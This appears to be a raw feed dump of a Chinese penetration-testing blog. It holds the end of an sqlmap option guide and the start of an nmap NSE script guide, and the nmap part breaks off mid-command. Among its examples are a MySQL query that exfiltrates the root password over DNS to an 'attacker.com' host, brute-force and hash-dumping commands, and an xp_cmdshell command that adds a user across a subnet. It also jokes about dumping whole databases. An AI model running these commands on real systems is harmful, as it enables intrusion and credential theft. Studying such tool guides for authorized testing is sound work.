title="sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。"></a>sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。</h5><p>为了避免误报，可指定字符串或者正则表达式来区分原始页面和报错页面（–string参数添加字符串，–regexp添加正则）<br>也可以提供一段字符串在原始页面与true下的页面都不存在的字符串，而false页面中存在的字符串（–not-string添加）。<br>用户也可以提供true与false返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，–code=200。<br>参数：–text-only,–titles<br>想具体查询true和false下页面的差异位置，可以使用–text-only（HTTP文本内容）–titles（HTML的title标签）</p><h3 id="Techniques-技巧"><a href="#Techniques-技巧" class="headerlink" title="Techniques 技巧"></a>Techniques 技巧</h3><p>这些选项用于调整特定sql注入技术的技巧</p><h4 id="–technique-TECH"><a href="#–technique-TECH" class="headerlink" title="–technique=TECH"></a>–technique=TECH</h4><h5 id="sql注入方式："><a href="#sql注入方式：" class="headerlink" title="sql注入方式："></a>sql注入方式：</h5><p>默认把BEUSTQ全来一遍，可根据实际情况进行调整，<br>例如可使用时间延迟，看网站响应时间来判断是否有注入，可根据报错判断注入。如果不是很懂，就不用管，虽然时间长点，但很全面。<br>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）<br>Q: Inline SQL Injection  (内联注入)</p><h4 id="–time-sec-TIMESEC"><a href="#–time-sec-TIMESEC" class="headerlink" title="–time-sec=TIMESEC"></a>–time-sec=TIMESEC</h4><h5 id="数据库响应延时秒数-默认5"><a href="#数据库响应延时秒数-默认5" class="headerlink" title="数据库响应延时秒数 默认5"></a>数据库响应延时秒数 默认5</h5><p>当使用基于时间延迟注入的盲注时，<br>时刻使用–time-sec参数设定延时时间，默认是5秒，<br>可以根据环境记性调整，比如网络延迟很大，可适当增加延时时间</p><h4 id="–union-cols-UCOLS"><a href="#–union-cols-UCOLS" class="headerlink" title="–union-cols=UCOLS"></a>–union-cols=UCOLS</h4><h5 id="指定SQL注入查询的列的范围"><a href="#指定SQL注入查询的列的范围" class="headerlink" title="指定SQL注入查询的列的范围"></a>指定SQL注入查询的列的范围</h5><p>设定的值为一段整数范围，制定区间，此数值默认为1-10，<br>随着–levle增加，当为5的时候增加为50，<br>当level级别和取值范围不匹配，在低级别需求更大的范围，可通过设定–union-cols的值来实现。</p><h4 id="–union-char-UCHAR"><a href="#–union-char-UCHAR" class="headerlink" title="–union-char=UCHAR"></a>–union-char=UCHAR</h4><h5 id="指定暴力破解列数的字符"><a href="#指定暴力破解列数的字符" class="headerlink" title="指定暴力破解列数的字符"></a>指定暴力破解列数的字符</h5><p>设定union查询使用的字符，默认使用NULL，<br>但是可能会返回失败，–union-char指定UNION查询的字符。</p><h4 id="–union-from-UFROM"><a href="#–union-from-UFROM" class="headerlink" title="–union-from=UFROM"></a>–union-from=UFROM</h4><h5 id="指定sql注入查询的表"><a href="#指定sql注入查询的表" class="headerlink" title="指定sql注入查询的表"></a>指定sql注入查询的表</h5><p>指定查询的表，配合上文暴力破解的字符、范围等来详细使用。</p><h4 id="–dns-domain-DNS"><a href="#–dns-domain-DNS" class="headerlink" title="–dns-domain=DNS.."></a>–dns-domain=DNS..</h4><h5 id="指定用于DNS漏出攻击的域名"><a href="#指定用于DNS漏出攻击的域名" class="headerlink" title="指定用于DNS漏出攻击的域名"></a>指定用于DNS漏出攻击的域名</h5><p>DNS注入攻击不做过多解释，有机会详细解释一下，<br>实际就是通过DNS隐蔽通道和恶意代码来使web来执行解析参数导致信息泄露。<br>可通过sqlmap的语句进行查询使用，当指定此参数且具有注入漏洞的情况下，可更快速且影响更小的获得内容。<br>以下是使用MySQL的函数LOAD_FILE()将系统管理员的密码通过DNS解析机制传输的例子：<br>SELECTLOAD_FILE(CONCAT(‘\\\\’,(SELECT password FROM mysql.user WHERE user=’root’    LIMIT 1),’.attacker.com\\foobar’));</p><h4 id="–second-order-S"><a href="#–second-order-S" class="headerlink" title="–second-order=S.."></a>–second-order=S..</h4><h5 id="生成url搜索页面结果的二级响应"><a href="#生成url搜索页面结果的二级响应" class="headerlink" title="生成url搜索页面结果的二级响应"></a>生成url搜索页面结果的二级响应</h5><p>二次注入查询，当判断注入响应不是当前页面，<br>可使用此参数制定另一个页面来进行测试，<br>根据页面响应判断结果为true或false。</p><h3 id="Fingerprint-指纹"><a href="#Fingerprint-指纹" class="headerlink" title="Fingerprint 指纹"></a>Fingerprint 指纹</h3><h4 id="f-执行检查广泛的DBMS版本的指纹"><a href="#f-执行检查广泛的DBMS版本的指纹" class="headerlink" title="-f 执行检查广泛的DBMS版本的指纹"></a>-f 执行检查广泛的DBMS版本的指纹</h4><p>通过此参数来执行更广泛、详细的指纹识别</p><h3 id="Enumeration-枚举"><a href="#Enumeration-枚举" class="headerlink" title="Enumeration 枚举"></a>Enumeration 枚举</h3><p>这些选项可用于枚举后端数据库管理系统信息、表里的数据接口，此外还可以运行你的sql语句</p><h4 id="a-–all-检索所有"><a href="#a-–all-检索所有" class="headerlink" title="-a, –all   检索所有"></a>-a, –all   检索所有</h4><h5 id="此参数在没有获得数据库信息的时候用的较多，"><a href="#此参数在没有获得数据库信息的时候用的较多，" class="headerlink" title="此参数在没有获得数据库信息的时候用的较多，"></a>此参数在没有获得数据库信息的时候用的较多，</h5><p>来检索所有内容，在一旦注入成功且获得精确信息<br>通过以下详细参数来指定检索、枚举动作和动作执行对象。</p><h4 id="b-–banner-检索DBMS的banner"><a href="#b-–banner-检索DBMS的banner" class="headerlink" title="-b, –banner         检索DBMS的banner"></a>-b, –banner         检索DBMS的banner</h4><p>–current-user       检索DBMS的当前用户<br>–current-db         检索DBMS的数据库<br>–hostname           检索DBMS的host<br>–is-dba             检测DBMS的当前用户是否是DBA<br>–users              枚举DBMS的用户<br>–passwords          枚举DBMS的密码hash<br>–privileges         枚举DBMS的用户权限<br>–roles              枚举DBMS的用户角色<br>–dbs                枚举DBMS的所有数据库<br>–tables             枚举DBMS的数据库里的所有表<br>–columns            枚举DBMS的数据库里表的所有列<br>–schema             枚举DBMS的概要<br>–count              检索表的条目数<br>–dump               转存DBMS数据库表项<br>–dump-all           转存所有DBMS数据库的表项<br>–search             搜索列、表、和或数据库名<br>–comments           检索DBMS信息<br>-D DB                指定枚举的库<br>-T TBL               指定枚举的表<br>-C COL               指定枚举的表列<br>-X EXCLUDECOL        指定不枚举的表列<br>-U USER              指定枚举的用户<br>–exclude-sysdbs    枚举表的时候排除系统数据库<br>–where=DUMPWHERE    dump表的时候指定路径<br>–start=LIMITSTART   第一个检索输出条目<br>–stop=LIMITSTOP     最后一个检索输出条目<br>–first=FIRSTCHAR    第一个检索输出的字符串<br>–last=LASTCHAR      最后一个检索输出的字符串</p><h5 id="到这一步的时候，代表已经注入成功，需要对注入成功的库执行操作，这里是比较常见的操作："><a href="#到这一步的时候，代表已经注入成功，需要对注入成功的库执行操作，这里是比较常见的操作：" class="headerlink" title="到这一步的时候，代表已经注入成功，需要对注入成功的库执行操作，这里是比较常见的操作："></a>到这一步的时候，代表已经注入成功，需要对注入成功的库执行操作，这里是比较常见的操作：</h5><p>检索DBMS的指纹特征、数据库、host值、用户身份、并对用户、密码、权限、角色进行枚举也就是爆破。<br>然后尝试枚举数据库、数据库里的表、数据库里的内容、可以使用count来统计条目等操作。<br>dump和dump-all就是脱裤和全脱的区别，dump某表的十条八条可能没事儿，dump-all注定要浪迹天涯，也就是所谓的从脱裤到跑路的开始，<br>通过-D-T-C来制定索要枚举的库、表、和列，使用-X来排除不想要的列，特别是有多列且有无意义字段的时候，使用-X可大大节省时间。<br>–exclude-sysdbs参数，将不会获取数据库自带的系统库内容，可减少干扰内容，对-count的使用和枚举信息的使用建议搭配此参数来排除系统库。<br>当我们不想跑路的时候，那么请使用一下内容：<br>    –start=LIMITSTART  First query output entry to retrieve<br>        指定从第几行开始输出，如–start=1<br>    –stop=LIMITSTOP    Last query output entry to retrieve<br>        指定从第几行停止输出 –stop=10<br>    –first=FIRSTCHAR   First query output word character to retrieve<br>        指定从第几个字符开始输出 –first 1<br>    –last=LASTCHAR     Last query output word character to retrieve<br>        指定从第几个字符停止输出 –last10 </p><h4 id="–sql-query-QUERY-执行的sql语句"><a href="#–sql-query-QUERY-执行的sql语句" class="headerlink" title="–sql-query=QUERY    执行的sql语句"></a>–sql-query=QUERY    执行的sql语句</h4><p>–sql-shell          交互式sqlshell<br>–sql-file=SQLFILE   从文件里运行sql语句</p><h5 id="指定想执行的语句，注入成功后自动执行，例如新建用户、dump-all等"><a href="#指定想执行的语句，注入成功后自动执行，例如新建用户、dump-all等" class="headerlink" title="指定想执行的语句，注入成功后自动执行，例如新建用户、dump-all等"></a>指定想执行的语句，注入成功后自动执行，例如新建用户、dump-all等</h5><p>系统交互shell，一旦成功可执行任意语句，例如wget、curl、useradd、nc等<br>从文件中读取执行想要执行的sql语句</p><h3 id="Brute-force-暴力"><a href="#Brute-force-暴力" class="headerlink" title="Brute force 暴力"></a>Brute force 暴力</h3><p>这些选项用于暴力检查</p><h4 id="–common-tables-检查通用表"><a href="#–common-tables-检查通用表" class="headerlink" title="–common-tables  检查通用表"></a>–common-tables  检查通用表</h4><p>–common-columns 检查通用列</p><h5 id="暴力检查："><a href="#暴力检查：" class="headerlink" title="暴力检查："></a>暴力检查：</h5><p>猜测检查常见的、通用的表名和列名，可通过下面两个文件进行定制化<br>暴力破解的表在txt/common-tables.txt文件中<br>暴力破解的列名在txt/common-columns.txt中</p><h3 id="User-defined-function-injection-用户定义注入函数"><a href="#User-defined-function-injection-用户定义注入函数" class="headerlink" title="User-defined function injection 用户定义注入函数"></a>User-defined function injection 用户定义注入函数</h3><h4 id="–udf-inject-使用用户自定义的函数进行注入"><a href="#–udf-inject-使用用户自定义的函数进行注入" class="headerlink" title="–udf-inject  使用用户自定义的函数进行注入"></a>–udf-inject  使用用户自定义的函数进行注入</h4><p>–shared-lib=SHLIB  共享库的本地路径</p><h5 id="自定义函数："><a href="#自定义函数：" class="headerlink" title="自定义函数："></a>自定义函数：</h5><p>通过编译注入自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，<br>上传到服务器数据库自定义函数，然后根据选择执行他们。本人基本不用自定义函数，共享库和系统函数超出我的知识范围。</p><h3 id="File-system-access-访问文件系统"><a href="#File-system-access-访问文件系统" class="headerlink" title="File system access 访问文件系统"></a>File system access 访问文件系统</h3><p>用于访问后端数据库管理系统的底层文件系统</p><h4 id="–file-read-RFILE-从后台DBMS文件系统里读取一个文件"><a href="#–file-read-RFILE-从后台DBMS文件系统里读取一个文件" class="headerlink" title="–file-read=RFILE  从后台DBMS文件系统里读取一个文件"></a>–file-read=RFILE  从后台DBMS文件系统里读取一个文件</h4><p>–file-write=WFILE 从后台DBMS文件系统里写一个本地文件<br>–file-dest=DFILE   后端DBMS写入的绝对文件路径 </p><h5 id="针对文件系统的读写："><a href="#针对文件系统的读写：" class="headerlink" title="针对文件系统的读写："></a>针对文件系统的读写：</h5><p>对–file-read配置绝对系统路径，<br>可读取相应文件内容，可以是文本，也可以是二进制，<br>条件是必须拥有相对应特权，已知的是mysql、postgresql和sqlserver。<br>写入也是同样，往远端后台的DBMS里写入一个本地文件，可通过–file-dest指定绝对文件路径。</p><h3 id="Operating-system-access-操作系统连接"><a href="#Operating-system-access-操作系统连接" class="headerlink" title="Operating system access 操作系统连接"></a>Operating system access 操作系统连接</h3><p>用于连接后端DBMS底层的os</p><h4 id="–os-cmd-OSCMD-运行一个OS命令"><a href="#–os-cmd-OSCMD-运行一个OS命令" class="headerlink" title="–os-cmd=OSCMD  运行一个OS命令"></a>–os-cmd=OSCMD  运行一个OS命令</h4><p>–os-shell 建立交互式的os shell<br>–os-pwn 建立一个 oob shel meterpreter或者vnc<br>–os-smbrelay  一键生成oob shel meterpreter或者vnc<br>–os-bof 利用存储过程缓冲区溢出<br>–priv-esc 用户权限提升<br>–msf-path=MSFPATH  安装metasploit framework的本地路径<br>–tmp-path=TMPPATH 临时文件目录的远程绝对路径</p><h5 id="对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。"><a href="#对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。" class="headerlink" title="对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。"></a>对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。</h5><p>当然和上面可以配合使用，当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。<br>然后通过上面的文件系统管理上传一个库，使用可执行系统命令的sys_exec()和sys_eval()，甚至xp_cmdshell存储过程<br>–os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。<br>Meterpreter配合使用<br>–os-pwn,–os-smbrelay,–os-bof,–priv-esc,–msf-path,–tmp-path配合Meterpreter使用，<br>当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，<br>这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，四种方式执行它：<br>1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：–os-pwn。<br>2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：–os-pwn。<br>3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），–os-smbrelay。<br>4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：–os-bof</p><h3 id="windows注册表连接"><a href="#windows注册表连接" class="headerlink" title="windows注册表连接"></a>windows注册表连接</h3><p>用于连接后端DBMS的windows 注册表</p><h4 id="–reg-read-读取windows-注册表键值"><a href="#–reg-read-读取windows-注册表键值" class="headerlink" title="–reg-read          读取windows 注册表键值"></a>–reg-read          读取windows 注册表键值</h4><p>–reg-add           编辑一个windows注册表键值数据<br>–reg-del           删除一个windows注册表键值<br>–reg-key=REGKEY    windows注册表项<br>–reg-value=REGVAL  windows注册表项的值<br>–reg-data=REGDATA  windows注册表项的数据<br>–reg-type=REGTYPE  windows注册表项值的类型</p><h5 id="所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，"><a href="#所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，" class="headerlink" title="所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，"></a>所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，</h5><p>所有的windows系统配置在注册表里都可实现，比如开启远程连接、比如新建用户、比如组策略配置、比如防火墙等等，<br>这里的reg现象可对注册表内容进行读取、编辑、和删除，上面和下面相配合可实现对指定的key、value、data和类型进行操作。</p><h3 id="通用参数和混杂选项"><a href="#通用参数和混杂选项" class="headerlink" title="通用参数和混杂选项"></a>通用参数和混杂选项</h3><h4 id="【通用参数】"><a href="#【通用参数】" class="headerlink" title="【通用参数】"></a>【通用参数】</h4><p>-s SESSIONFILE      从存储文件里加载session<br>-t TRAFFICFILE       记录所有的http流量到一个文本文件<br>–batch             使用默认配置，不管用户的输入<br>–charset=CHARSET   强制数据检索编码格式<br>–crawl=CRAWLDEPTH   从目标网站开始爬取网站<br>–csv-del=CSVDEL    CSV输出文件使用的分割字符<br>–dump-format=DU..  dump数据的格式<br>–eta               显示输出的预计用时<br>–flush-session     为当前目标刷新session文件<br>–forms             在目标url上解析和测试表单<br>–fresh-queries     忽略在session文件里的查询结果<br>–hex               使用DBMS的hex函数进行数据检索<br>–output-dir=OUT..   输出路径<br>–parse-errors      解析和列出DBMS的响应错误信息<br>–pivot-column=P..  主列名称<br>–save              保存选项到一个ini配置文件<br>–scope=SCOPE       指定正则表达式从提供的代理日志里过滤目标<br>–test-filter=TE..  选择测试payload或titles<br>–update            更新sqlmap</p><p>【混杂参数】<br>-z MNEMONICS        使用短助记符(e.g. “flu,bat,ban,tec=EU”)<br>–alert=ALERT       当发现sql注入时，运行主机os命令<br>–answers=ANSWERS   设置问题答案(e.g. “quit=N,follow=N”)<br>–beep              当发现sql注入时，发出蜂鸣声<br>–cleanup           从sqlmap特定的udf和表里清除dbms<br>–dependencies      检查sqlmap缺少的依赖关系<br>–disable-coloring  禁用控制台输出颜色<br>–gpage=GOOGLEPAGE  指定使用的google dork响应的页码<br>–identify-waf      绕过WAF IPS IDS<br>–mobile            使用UA模拟成智能手机<br>–page-rank         展示google dork结果的页码值<br>–purge-output      从输出目录安全移除所有内容<br>–smart             在积极启发的情况下进行彻底的测试<br>–sqlmap-shell      构建一个交互式sqlmap shell<br>–wizard            初学者简单向导</p><h5 id="这两项内容属于常用技巧类搭配动作，可根据翻译使用，不做过多解释，这里提一下几个需要注意的参数，"><a href="#这两项内容属于常用技巧类搭配动作，可根据翻译使用，不做过多解释，这里提一下几个需要注意的参数，" class="headerlink" title="这两项内容属于常用技巧类搭配动作，可根据翻译使用，不做过多解释，这里提一下几个需要注意的参数，"></a>这两项内容属于常用技巧类搭配动作，可根据翻译使用，不做过多解释，这里提一下几个需要注意的参数，</h5><p>–batch  在使用sqlmap时，有时一些响应需要用户交互，输入Y、N、sky、quit等，使用此选项可使用默认配置。<br>–output-dir=  指定输出路径，方式控制台输出过多，无法查看，也方便记录<br>–gpage=GOOGLEPAGE 好像默认是使用google搜索的前100个文件，当使用前面的-g参数，配合此参数指定页面<br>–identify-waf  进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别<br>–mobile 使用移动产品UA，把sqlmap伪装成手机，也可使用前面的-user-agent自己指定<br>–smart  智能深度启发式扫描，或许额会有惊喜呢。<br>–wizard 和上面的完全不同，纯新手选择，一步步让你输入url等参数，基本输入个url就行。</p>]]></content>
      
      
      <categories>
          
          <category> PenTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenTest </tag>
            
            <tag> PenTestTool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap进阶使用-脚本篇</title>
      <link href="/2019/03/24/nmap-jin-jie-shi-yong-jiao-ben-pian/"/>
      <url>/2019/03/24/nmap-jin-jie-shi-yong-jiao-ben-pian/</url>
      
        <content type="html"><![CDATA[<p><img src="nmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E7%AF%87.png" alt></p><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>因为今天的重点并非nmap本身使用,这次主要还是想给大家介绍一些在实战中相对比较实用的nmap脚本,所以关于nmap自身的一些选项作用就不再多说了,详情可参考博客端口渗透相关文章,废话少说,我们直接开始,实际中我们可以先用下面的语句,大概扫一眼目标机器或目标C段都跑了什么服务,心里先有个谱,之后才好针对性的出牌嘛:</p><a id="more"></a><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># nmap -sV -sT -Pn --open -v 192.168.3.23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然,你也可以尝试先获取下目标机器各个服务更详细的banner信息,因为有些服务工具漏洞只能影响特定的版本,所以,提前知道一下还是非常有必要的:</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sT -Pn --open -v banner.nse 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x02-和ftp相关的一些漏洞检测脚本"><a href="#0x02-和ftp相关的一些漏洞检测脚本" class="headerlink" title="0x02 和ftp相关的一些漏洞检测脚本:"></a>0x02 和ftp相关的一些漏洞检测脚本:</h3><p>ftp-anon.nse    检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># nmap -p 21 --script ftp-anon.nse -v 192.168.3.23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ftp-brute.nse    ftp爆破脚本 只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ftp-vuln-cve2010-4221.nse    ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ftp-proftpd-backdoor.nse    ProFTPD 1.3.3c 被人插后门proftpd-1.3.3c.tar.bz2,缺省只执行id命令,可自行到脚本中它换成能直接弹bash的命令</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ftp-vsftpd-backdoor.nse    VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-vsftpd-backdoor.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x03-和ssh-相关的一些扫描脚本"><a href="#0x03-和ssh-相关的一些扫描脚本" class="headerlink" title="0x03 和ssh 相关的一些扫描脚本:"></a>0x03 和ssh 相关的一些扫描脚本:</h3><p>sshv1.nse     sshv1是可以中间人的</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 22 --script sshv1.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x04和smtp-相关的一些扫描脚本"><a href="#0x04和smtp-相关的一些扫描脚本" class="headerlink" title="0x04和smtp 相关的一些扫描脚本"></a>0x04和smtp 相关的一些扫描脚本</h3><p>smtp-brute.nse    简单爆破smtp</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>smtp-enum-users.nse      枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-enum-users.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>smtp-vuln-cve2010-4344.nse    Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-vuln-cve2010-4344.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>smtp-vuln-cve2011-1720.nse     Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-vuln-cve2011-1720.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>smtp-vuln-cve2011-1764.nse     Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-vuln-cve2011-1764.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x05-和pop3-相关的一些扫描脚本"><a href="#0x05-和pop3-相关的一些扫描脚本" class="headerlink" title="0x05 和pop3 相关的一些扫描脚本:"></a>0x05 和pop3 相关的一些扫描脚本:</h3><p>pop3-brute.nse    pop简单弱口令爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 110 --script pop3-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x06-和imap-相关的一些扫描脚本"><a href="#0x06-和imap-相关的一些扫描脚本" class="headerlink" title="0x06 和imap 相关的一些扫描脚本:"></a>0x06 和imap 相关的一些扫描脚本:</h3><p>imap-brute.nse    imap简单弱口令爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 143,993 --script imap-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x07-和dns-相关的一些漏洞扫描脚本"><a href="#0x07-和dns-相关的一些漏洞扫描脚本" class="headerlink" title="0x07 和dns 相关的一些漏洞扫描脚本:"></a>0x07 和dns 相关的一些漏洞扫描脚本:</h3><p>dns-zone-transfer.nse     检查目标ns服务器是否允许传送</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 53 --script dns-zone-transfer.nse -v 192.168.3.23nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain<span class="token operator">=</span>target.org -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>hostmap-ip2hosts.nse     旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 --script hostmap-ip2hosts.nse 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x08-和各种数据库相关的扫描脚本"><a href="#0x08-和各种数据库相关的扫描脚本" class="headerlink" title="0x08 和各种数据库相关的扫描脚本:"></a>0x08 和各种数据库相关的扫描脚本:</h3><p>informix-brute.nse   informix爆破脚本</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 9088 --script informix-brute.nse 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql-empty-password.nse   mysql 扫描root空密码</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-empty-password.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql-brute.nse    mysql root弱口令简单爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql-dump-hashes.nse    导出mysql中所有用户的hash</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-dump-hashes --script-args<span class="token operator">=</span><span class="token string">'username=root,password=root'</span> 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql-vuln-cve2012-2122.nse   Mysql身份认证漏洞MariaDB and MySQL  5.1.61,5.2.11, 5.3.5, 5.5.22,利用条件有些苛刻 需要目标的mysql是自己源码编译安装的,这样的成功率相对较高</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-vuln-cve2012-2122.nse  -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ms-sql-info.nse 扫描C段mssql</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 445 --script ms-sql-info.nse -v 203.124.11.0/24      nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port<span class="token operator">=</span>1433 -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ms-sql-empty-password.nse     扫描mssql sa空密码</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ms-sql-brute.nse    sa弱口令爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-brute.nse -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ms-sql-xp-cmdbash.nse   利用xp_cmdbash,远程执行系统命令</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-xp-cmdbash --script-args mssql.username<span class="token operator">=</span>sa,mssql.password<span class="token operator">=</span>sa,ms-sql-xp-cmdbash.cmd<span class="token operator">=</span><span class="token string">"net user test test /add"</span> 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ms-sql-dump-hashes.nse    导出mssql中所有的数据库用户及密码hash</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pgsql-brute.nse   尝试爆破postgresql</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 5432 --script pgsql-brute -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>oracle-brute-stealth.nse  尝试爆破oracle</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid<span class="token operator">=</span>ORCL  -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>oracle-brute.nse</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid<span class="token operator">=</span>ORCL -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mongodb-brute.nse   尝试爆破mongdb</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 